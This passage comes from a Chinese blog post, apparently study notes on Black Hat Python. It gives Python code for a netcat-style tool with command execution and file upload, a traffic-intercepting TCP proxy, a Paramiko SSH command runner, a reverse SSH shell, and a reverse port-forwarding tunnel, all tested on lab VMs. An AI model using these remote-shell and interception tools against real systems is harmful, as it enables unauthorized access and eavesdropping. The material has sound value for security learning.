f:</span><br><span class="line">                f.write(data + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            client_socket.send(<span class="string">&quot;Successfully saved.&quot;</span>.encode())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">&quot;Failed to save.&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 如果需要反弹一个shell，需要进入另一个循环</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd_buff = client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            resp = run_command(cmd_buff.decode())</span><br><span class="line">            client_socket.send(resp)</span><br></pre></td></tr></table></figure>
<p>文件上传部分：服务器执行的时候需要先指定一个文件。反弹shell，把用户的输入当作命令执行。</p>
<p>运行结果：</p>
<ol type="1">
<li><p>文件上传</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611150134.png" /></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611150156.png" /></p>
<p>第一句话是最开始测试的时候留下来的。</p></li>
<li><p>反弹shell</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611150250.png" /></p></li>
</ol>
<p>能够简单的实现，但是需要做到好用，还需要更多的优化。</p>
<h1 id="tcp代理">6. TCP代理</h1>
<p>首先介绍一下TCP代理是什么，以及工作原理是什么。</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611185322.png" /></p>
<p>如上图，正常的情况下 local 和 remote 建立TCP连接就像图中
<strong>红色虚线箭头</strong> 一样。但是有了代理就不一样了。local 会先和
proxy 建立TCP连接，proxy 会和 remote
建立TCP连接，这样，local发送给remote的信息就会先到达proxy，然后经由proxy转发到达remote，remote发送给local的信息也是先到达proxy。</p>
<p>有了代理，那我们就能够知道本地进程和服务器进程之间通信的内容（假设是明文），抓包工具的原理就是这样。</p>
<p>既然知道了原理，那实现起来就比较简单了：</p>
<ol type="1">
<li>local负责主动连接proxy</li>
<li>proxy主动连接remote</li>
<li>proxy需要接收local和remote的消息，（按照自己的喜欢进行修改），然后发送给对方</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_loop</span>(<span class="params">local_host, local_port, remote_host, remote_port, receive_first</span>):</span></span><br><span class="line">    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        server.bind((local_host, local_port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[!!] Failed to listen on %s:%d&quot;</span> % (local_host, local_port))</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(e))</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (local_host, local_port))</span><br><span class="line"></span><br><span class="line">    server.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        client_socket, addr = server.accept()</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Received incoming connection from %s:%d&quot;</span> % (addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line">        proxy_thread = threading.Thread(target=proxy_handler, args=(client_socket,remote_host, remote_port, receive_first))</span><br><span class="line">        proxy_thread.start()</span><br></pre></td></tr></table></figure>
<p>代理服务器的代码：主要的内容就是等待local的连接，并为每一个local
socket创建一个线程，处理相关的信息通信。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]) != <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: ./proxy.py [local_host] [local_port] [remote_host] [remote_port] [receive_first]&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    local_host = sys.argv[<span class="number">1</span>]</span><br><span class="line">    local_port = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    remote_host = sys.argv[<span class="number">3</span>]</span><br><span class="line">    remote_port = <span class="built_in">int</span>(sys.argv[<span class="number">4</span>])</span><br><span class="line">    receive_first = sys.argv[<span class="number">5</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;1&quot;</span> <span class="keyword">in</span> receive_first:</span><br><span class="line">        receive_first = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        receive_first = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    server_loop(local_host, local_port, remote_host, remote_port, receive_first)</span><br></pre></td></tr></table></figure>
<p>main 代码：主要就是接收命令行选项，然后启动代理服务器。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_handler</span>(<span class="params">local, remote_host, remote_port, receive_first</span>):</span></span><br><span class="line">    remote = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    remote.connect((remote_host, remote_port))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> receive_first:</span><br><span class="line">        remote_buffer = receive_from(remote) <span class="comment"># receive from remote process</span></span><br><span class="line">        remote_buffer = response_handler(remote_buffer) <span class="comment"># modifiy the response from remote to local</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Sending %d bytes to local.&quot;</span> % <span class="built_in">len</span>(remote_buffer))</span><br><span class="line">            local.send(remote_buffer.encode()) <span class="comment"># send to local process</span></span><br><span class="line">            remote_buffer = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        local_buffer = receive_from(local)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(local_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Received %d bytes from local.&quot;</span> % <span class="built_in">len</span>(local_buffer))</span><br><span class="line"></span><br><span class="line">            local_buffer = request_handler(local_buffer) <span class="comment"># modifiy the request from local to remote</span></span><br><span class="line">            remote.send(local_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[==&gt;] Sent to remote.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        remote_buffer = receive_from(remote)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(remote_buffer):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Received %d bytes from remote.&quot;</span> % <span class="built_in">len</span>(remote_buffer))</span><br><span class="line"></span><br><span class="line">            remote_buffer = response_handler(remote_buffer)</span><br><span class="line">            local.send(remote_buffer)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[&lt;==] Sent to local.&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> local_buffer == <span class="string">b&#x27;\n&#x27;</span>  <span class="keyword">and</span> remote_buffer == <span class="string">b&#x27;\n&#x27;</span>:</span><br><span class="line">            local.close()</span><br><span class="line">            remote.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] No more data. Closing connections.&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            sys.exit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<p>每个线程做的工作，也是代理服务器的主要部分！首先就是利用remote的参数建立TCP连接。<code>receive_first</code>
主要是用来处理“连接上remote，remote就会发送消息的情况，这种情况下要先接收remote的信息，再转发给local”，可以不写这一部分，不影响整体的使用。</p>
<p>其次，是一个无限循环，工作分别为：</p>
<ol type="1">
<li>从local接收信息，做一定处理，转发给remote</li>
<li>从remote接收响应，做一定处理，转发给local</li>
<li>判断通信是否结束</li>
</ol>
<p>因为实现的功能比较简单，这里只能“local先发送消息，然后remote响应”的“一应一答”的工作模式。最后如果local和remote发送的都是<code>\n</code>，说明通信结束。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_from</span>(<span class="params">conn</span>):</span></span><br><span class="line">    data = conn.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="built_in">print</span>(data.decode())</span><br><span class="line">    <span class="keyword">return</span> data <span class="comment"># return bytes</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">request_handler</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    <span class="comment"># modifiy data</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">response_handler</span>(<span class="params">buffer</span>):</span></span><br><span class="line">    <span class="comment"># modifiy data</span></span><br><span class="line">    <span class="keyword">return</span> buffer</span><br></pre></td></tr></table></figure>
<p>这里的代码就是 <code>proxy_handler</code> 中使用的辅助函数。</p>
<ol type="1">
<li><code>receive_from()</code>：接收信息，并显示信息内容</li>
<li><code>request_handler()/response_handler()</code> ：分别对local
-&gt; remote，remote -&gt; local 的信息做处理。不过我这里没有处理</li>
</ol>
<p>最后的运行顺序：</p>
<ol type="1">
<li>服务器先启动</li>
<li>proxy启动</li>
<li>客户端启动</li>
</ol>
<p>结果如下：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611190910.png" /></p>
<p>proxy确实可以看到通信的内容：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611190937.png" /></p>
<h1 id="通过paramiko使用ssh">7. 通过Paramiko使用SSH</h1>
<p>Paramiko库的使用可以看：[[paramiko模块和SSH基础]]。这里先写一个简单的代码了解一下如何通过paramiko使用SSH</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span>(<span class="params">ip, user, passwd, command</span>):</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    <span class="comment"># client.load_host_keys(&#x27;/home/m1ku/.ssh/known_hosts&#x27;)</span></span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, username=user, password=passwd)</span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.exec_command(command)</span><br><span class="line">        <span class="built_in">print</span>(ssh_session.recv(<span class="number">1024</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    user = sys.argv[<span class="number">2</span>]</span><br><span class="line">    passwd = sys.argv[<span class="number">3</span>]</span><br><span class="line">    command = sys.argv[<span class="number">4</span>]</span><br><span class="line">    ssh_command(ip, user, passwd, command)</span><br></pre></td></tr></table></figure>
<ul>
<li><code>client = paramiko.SSHClient()</code>
创建一个ssh客户端对象</li>
<li><code>client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</code>
自动添加和保存目标ssh服务器的ssh密钥</li>
</ul>
<p>执行效果为：</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611204948.png" /></p>
<p>成功执行了 id 命令。并且，如果我使用root执行
<code>python3 bh_sshcmd.py 10.0.2.4 m1ku m1ku id</code></p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220611205228.png" /></p>
<p>会发现执行 id 的结果还是 m1ku。</p>
<p>上面的代码是<strong>ssh客户端连接到服务器</strong>，接下来反过来，写一个<strong>从服务器到客户端</strong>的代码。
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko, shlex, subprocess</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssh_command</span>(<span class="params">ip, port, user, passwd, cmd</span>):</span></span><br><span class="line">    client = paramiko.SSHClient()</span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    client.connect(ip, port=port, username=user, password=passwd)</span><br><span class="line"></span><br><span class="line">    ssh_session = client.get_transport().open_session()</span><br><span class="line">    <span class="keyword">if</span> ssh_session.active:</span><br><span class="line">        ssh_session.send(cmd)</span><br><span class="line">        <span class="built_in">print</span>(ssh_session.recv(<span class="number">1024</span>).decode())</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            cmd = ssh_session.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cmd = cmd.decode()</span><br><span class="line">                <span class="keyword">if</span> cmd == <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                    client.close()</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                cmd_output = subprocess.check_output(shlex.split(cmd), shell=<span class="literal">True</span>)</span><br><span class="line">                ssh_session.send(cmd_output <span class="keyword">or</span> <span class="string">&#x27;okay&#x27;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                ssh_session.send(<span class="built_in">str</span>(e))</span><br><span class="line">        client.close()</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    user = <span class="built_in">input</span>(<span class="string">&#x27;Enter username: &#x27;</span>)</span><br><span class="line">    password = <span class="built_in">input</span>(<span class="string">&#x27;Enter password: &#x27;</span>)</span><br><span class="line">    ip = <span class="built_in">input</span>(<span class="string">&#x27;Enter server IP: &#x27;</span>)</span><br><span class="line">    port = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;Enter port: &#x27;</span>))</span><br><span class="line">    ssh_command(ip, port, user, password, <span class="string">&#x27;ClientConnected&#x27;</span>)</span><br></pre></td></tr></table></figure></p>
<p>上面代码：主要是接收服务器发送来的
command，然后在客户端执行，并把结果返回给服务器。</p>
<p>接着，写一个 <code>bh_sshserver.py</code> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os, paramiko, socket, sys, threading</span><br><span class="line">CWD = os.path.dirname(os.path.realpath(__file__)) <span class="comment"># 当前脚本的绝对路径</span></span><br><span class="line">HOSTKEY = paramiko.RSAKey(filename = os.path.join(CWD, <span class="string">&#x27;test_rsa.key&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>(<span class="params">paramiko.ServerInterface</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.event = threading.Event()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_channel_request</span>(<span class="params">slef, kind, chanid</span>):</span></span><br><span class="line">        <span class="keyword">if</span> kind == <span class="string">&#x27;session&#x27;</span>:</span><br><span class="line">            <span class="keyword">return</span> paramiko.OPEN_SUCCEEDED</span><br><span class="line">        <span class="keyword">return</span> paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_auth_password</span>(<span class="params">self, username, password</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (username == <span class="string">&#x27;m1ku&#x27;</span>) <span class="keyword">and</span> (password == <span class="string">&#x27;m1ku&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> paramiko.AUTH_SUCCESSFUL</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = <span class="string">&#x27;10.0.2.21&#x27;</span></span><br><span class="line">    port = <span class="number">3333</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock = socket.socket(socket.AF_IENT, socket.SOCK_STREAM)</span><br><span class="line">        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        sock.bind((server, port))</span><br><span class="line">        sock.listen(<span class="number">100</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Listening for connection...&#x27;</span>)</span><br><span class="line">        client, addr = sock.accept()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[-] Listen failed: &#x27;</span> + <span class="built_in">str</span>(e))</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># the follow codes will be excute if try no problem</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] Got a connection!&#x27;</span>, client, addr)</span><br><span class="line"></span><br><span class="line">    bhSession = paramiko.Transport(client) <span class="comment"># An SSH Transport attaches to a stream (usually a socket)</span></span><br><span class="line">    bhSession.add_server_key(HOSTKEY)</span><br><span class="line">    server = Server()</span><br><span class="line">    bhSession.start_server(server=server)</span><br><span class="line">    </span><br><span class="line">    chan = bhSession.accept(<span class="number">20</span>)</span><br><span class="line">    <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;*** No chcannel!&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Authenticated!&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(chan.recv(<span class="number">1024</span>))</span><br><span class="line">    chan.send(<span class="string">&#x27;Welcome to bh_ssh&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command = <span class="built_in">input</span>(<span class="string">&quot;Enter command: &quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> command != <span class="string">&#x27;exit&#x27;</span>:</span><br><span class="line">                chan.send(command)</span><br><span class="line">                r = chan.recv(<span class="number">8192</span>)</span><br><span class="line">                <span class="built_in">print</span>(r.decode())</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                chan.send(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;exiting&#x27;</span>)</span><br><span class="line">                bhSession.close()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        bhSession.close()</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>paramiko的demo里面有私钥文件，地址：<a
href="https://github.com/paramiko/paramiko/tree/main/demos">paramiko/demos
at main · paramiko/paramiko · GitHub</a></p>
</blockquote>
<p>首先创建了一个
class，class的内容就是这么写的，具体可以看库。里面除了init，还有检查channel和用户名密码。</p>
<p>接着先创建一个TCP
socket，等待客户端连接。如果有连接请求，并且accept，那么将SSH和socket连起来，此时SSH就可以通过socket发送和接收数据。其中私钥是用来签名的。</p>
<p>运行结果：</p>
<p>服务器启动之后，客户端连接服务器</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614094903.png" /></p>
<p>然后在服务器就能够输入命令，得到客户端执行命令的结果</p>
<p><img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220614094953.png" /></p>
<h1 id="ssh隧道">8. SSH隧道</h1>
<p>ssh隧道原理：[[SSH协议#7 SSH隧道技术]]</p>
<p>需求：将Ubuntu的80端口映射到kali的8081端口，这样只要能够访问kali:8081，就可以访问
Ubuntu:80。</p>
<p>kali：</p>
<ul>
<li>将随机一个端口与22端口做TCP socket连接</li>
<li>将22端口与Ubuntu的80端口做SSH连接</li>
</ul>
<blockquote>
<p>需要注意，kali
Ubuntu的网卡要在同一个网络。如果有其他主机想要通过kali访问Ubuntu，也要与kali在同一个网络。如果kali的一张网卡A和Ubuntu在一个网络，另一张网卡B与其他主机在一个网络，此时其他主机想要通过kali访问Ubuntu，需要在kali上做转发（从网卡B收到的数据将其转发出去，转发出去的分组的目的为网卡Aip和8081端口）。简单来说就是多了一步，这里没有涉及。</p>
</blockquote>
<p>先看主函数： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    options, server, remote = parse_options() <span class="comment"># return options, (server_host, server_port), (remote_host, remote_port)  </span></span><br><span class="line">  </span><br><span class="line">    password = <span class="literal">None</span>  </span><br><span class="line">    <span class="keyword">if</span> options.readpass:  </span><br><span class="line">        password = getpass.getpass(<span class="string">&#x27;Enter SSH password: &#x27;</span>)  </span><br><span class="line">  </span><br><span class="line">    client = paramiko.SSHClient()  </span><br><span class="line">    client.load_system_host_keys()  </span><br><span class="line">    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  </span><br><span class="line">    verbose(<span class="string">&quot;Connecting to ssh host %s:%d&quot;</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>]))  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        client.connect(server[<span class="number">0</span>], server[<span class="number">1</span>], username=options.user, key_filename=options.keyfile, look_for_keys=options.look_for_keys, password=password)  </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;*** Failed to connect to %s:%d: %r&quot;</span> % (server[<span class="number">0</span>], server[<span class="number">1</span>], e))  </span><br><span class="line">        sys.exit(<span class="number">1</span>)  </span><br><span class="line">    <span class="keyword">else</span>:  </span><br><span class="line">        verbose(<span class="string">&quot;Now forwarding remote port %d to %s:%d...&quot;</span> % (options.port, server[<span class="number">0</span>], server[<span class="number">1</span>]))  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        reverse_forward_tunnel(options.port, remote[<span class="number">0</span>], remote[<span class="number">1</span>], client.get_transport())  </span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;C:c: Port forwarding stopped.&quot;</span>)  </span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
<ol type="1">
<li><code>parse_options()</code> 函数利用 <code>optparse</code>
模块自定义的函数，主要的作用就是从命令行获得对应的参数，不是很重要</li>
<li><code>verbose()</code> 把它当成 print 理解，完全可以用 print
代替</li>
<li>如果传入的参数有 <code>--password</code> 则
<code>options.readpass = True</code>，就会执行
<code>password = getpass.getpass('Enter SSH password: ')</code>
输入密码</li>
<li>local 与 SSH server 建立socket，<code>key_filename</code> 和
<code>loof_for_keys</code> 没有使用，也可以不写</li>
<li>最终要的一步
<code>reverse_forward_tunnel(options.port, remote[0], remote[1], client.get_transport())</code>
与 remote 建立SSH连接</li>
</ol>
<p>这就是主函数做的全部事情。接着说一下 reverse_forward_tunnel 函数：
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_forward_tunnel</span>(<span class="params">server_port, remote_host, remote_port, transport</span>):</span></span><br><span class="line">    transport.request_port_forward(<span class="string">&quot;&quot;</span>, server_port) <span class="comment"># Ask the server to forward TCP connections from a listening port on the server, across this SSH session.</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        chan = transport.accept(<span class="number">100</span>)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        thr = threading.Thread(target=handler, args=(chan, remote_host, remote_port))</span><br><span class="line">        thr.setDaemon(<span class="literal">True</span>)</span><br><span class="line">        thr.start()</span><br></pre></td></tr></table></figure></p>
<ol type="1">
<li><code>transport.request_port_forward("", server_port)</code> 将访问
server_port 的流量转发</li>
<li>等待 local 的连接，如果有 local 请求，那么就为对应的 TCP socket
分配一个线程，处理 <code>handler</code> 函数</li>
<li>将这个线程设置为守护线程，然后开始</li>
</ol>
<blockquote>
<p><strong>守护线程</strong>：1.
守护线程会在“该进程内所有非守护线程全部都运行完毕后，守护线程才会挂掉”；2.
主线程在其他非守护线程运行完毕后才算运行完毕（守护线程在此时就被回收）。因为主线程的结束意味着进程的结束，进程整体的资源都将被回收
<strong>作用</strong>：防止所有线程都结束了，而该线程因为某种原因卡死导致整个程序不能停止。</p>
</blockquote>
<p>最后，看一下 handler 函数里面都做了什么。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">handler</span>(<span class="params">chan, host, port</span>):</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((host, port))</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        verbose(<span class="string">&#x27;Forwarding request to %s:%d failed: %r&#x27;</span> % (host, port, e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        verbose(<span class="string">&#x27;Connected! Tunnel open %r -&gt; %r -&gt; %r&#x27;</span> % (chan.origin_addr, chan.getpeername(), (host, port)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        r, w, x = select.select([sock, chan], [], [])</span><br><span class="line">        <span class="keyword">if</span> sock <span class="keyword">in</span> r:</span><br><span class="line">            data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            chan.send(data)</span><br><span class="line">        <span class="keyword">if</span> chan <span class="keyword">in</span> r:</span><br><span class="line">            data = chan.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            sock.send(data)</span><br><span class="line">    chan.close()</span><br><span class="line">    sock.close()</span><br><span class="line">    verbose(<span class="string">&#x27;Tunnel closed from %r&#x27;</span> % (chan.origin_addr, ))</span><br></pre></td></tr></table></figure></p>
<ol type="1">
<li>建立和 remote 的socket连接（<strong>ssh server 和 remote
连接：sock，ssh cliene 和 ssh server 连接：chan</strong>）</li>
<li>循环内部就是收、发数据的过程。sock和chan返回的是一个
<code>file-like</code> 的类型，可以读或者写。简单来说就是如果
sock和chan有数据要发，那么出现在w中。如果sock发送的有响应，那么 r
列表就会有 sock，chan也一样。</li>
<li>因为 chan
是有超时时间的，因此一段时间之后，就会自动退出循环，本次服务完成。回到
<code>reverse_forward_tunnel</code> 继续等待下一个请求</li>
</ol>
<p><code>r, w, x = select.select(rlist, wlist, xlist)</code>
输入参数如下：</p>
<ul>
<li>rlist：等待，直到可以开始读取</li>
<li>wlist：等待，直到可以开始写入</li>
<li>xlist：等待“异常情况”</li>
</ul>
<p>返回值：</p>
<ul>
<li>r：rlist的子集</li>
<li>w：wlist的子集</li>
<li>x：xlist的子集</li>
</ul>
<h1 id="完整代码">9. 完整代码</h1>
<h2 id="netcat">9.1. netcat</h2>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> getopt</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># global variables </span></span><br><span class="line">listen = <span class="literal">False</span></span><br><span class="line">command = <span class="literal">False</span></span><br><span class="line">upload = <span class="literal">False</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line">uploadDestination = <span class="string">&quot;&quot;</span></span><br><span class="line">port = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">usage</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*]BHP Net Tool&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: bhnet.py -t targetHost -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-l --listen\t- listen on [host]:[port] for incoming connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command\t- initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-u --upload=destination\t- upon receiving connection upload a file and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span 